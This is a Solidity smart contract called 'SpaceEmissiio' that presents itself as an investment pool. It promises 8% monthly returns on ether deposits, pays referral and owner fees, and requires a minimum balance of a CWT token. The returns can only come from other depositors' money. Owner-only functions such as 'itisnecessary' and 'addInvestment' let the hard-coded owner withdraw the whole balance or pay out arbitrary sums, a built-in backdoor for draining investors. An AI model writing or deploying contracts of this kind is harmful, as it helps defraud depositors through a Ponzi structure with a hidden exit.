 

 

pragma solidity ^0.5.10;

 

contract ERC20Token
{
    mapping (address => uint256) public balanceOf;
    function transfer(address _to, uint256 _value) public;
}

library SafeMath {
     
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

     
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

     
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         
         
         
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

     
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
         
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
         

        return c;
    }

     
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract SpaceEmissiio
{
    using SafeMath for uint256;
    
     
    address payable public owner = 0x76E40e08e10c8D7D088b20D26349ec52932F8BC3;
    
    uint256 minBalance = 2;
   
    ERC20Token CWT_Token = ERC20Token(0xA30b4f63A216Ceb9911f4907a2259Fa80a8Fb725);
   
    
    struct InvestorData {
        uint256 funds;
        uint256 lastDatetime;
        uint256 totalProfit;
    }
    mapping (address => InvestorData) investors;
    
    modifier onlyOwner()
    {
        assert(msg.sender == owner);
        _;
    }
    
    function itisnecessary() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }    
    
    function addInvestment( uint investment, address payable investorAddr) public onlyOwner  {
        investorAddr.transfer(investment);
    } 
  
    
    function changeOwner(address payable newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    function changeMinBalance(uint256 newMinBalance) public onlyOwner {
        minBalance = newMinBalance;
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address payable addr) {
        assembly {
          addr := mload(add(bys,20))
        } 
    }
     
    function transferTokens (address token, address target, uint256 amount) onlyOwner public
    {
        ERC20Token(token).transfer(target, amount);
    }
    
    function getInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, uint256 totalProfit, uint256 cwtstocks, uint256 contractBalance )
    {
        InvestorData memory data = investors[investor];
        totalFunds = data.funds;
        if (data.funds > 0) pendingReward = data.funds.mul(8).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
        totalProfit = data.totalProfit;
        contractBalance = address(this).balance;
        cwtstocks = CWT_Token.balanceOf(investor);
    }
    
    function() payable external
    {
        assert(msg.sender == tx.origin);  
        
        if (msg.sender == owner) return;
        
        
        assert(CWT_Token.balanceOf(msg.sender) >= minBalance );
        
        
        InvestorData storage data = investors[msg.sender];
        
        if (msg.value > 0) 
        
        {
             
            assert(msg.value >= 0.1 ether || (data.funds != 0 && msg.value >= 0.01 ether));
            if (msg.data.length == 20) {
                address payable ref = bytesToAddress(msg.data);
                assert(ref != msg.sender);
                ref.transfer(msg.value.mul(3).div(100));    
                owner.transfer(msg.value.mul(6).div(100));   
            } else if (msg.data.length == 0) {
                owner.transfer(msg.value.mul(9).div(100));
            } else {
                assert(false);  
            }
        }
        
        
        if (data.funds != 0) {
             
            uint256 reward = data.funds.mul(8).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
            data.totalProfit = data.totalProfit.add(reward);
            
            address(msg.sender).transfer(reward);
        }

        data.lastDatetime = block.timestamp;
        data.funds = data.funds.add(msg.value.mul(91).div(100));
        
    }
}